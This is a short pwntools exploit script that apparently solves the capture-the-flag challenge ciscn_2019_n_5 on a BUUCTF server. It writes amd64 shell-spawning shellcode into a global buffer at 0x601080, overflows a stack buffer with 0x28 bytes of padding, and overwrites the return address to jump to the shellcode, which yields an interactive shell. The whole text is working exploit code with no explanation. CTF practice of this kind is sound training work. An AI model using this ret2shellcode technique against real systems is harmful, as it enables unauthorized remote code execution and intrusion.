from pwn import*
elf=ELF('./ciscn_2019_n_5')
#p=process('./ciscn_2019_n_5')
p=remote('node4.buuoj.cn',27497)
context.arch="amd64"
shellcode=asm(shellcraft.amd64.sh())

name=0x601080
p.sendlineafter(b'your name',shellcode)

payload=b'a'*0x28+p64(name)
p.sendlineafter(b'me?',payload)
p.interactive()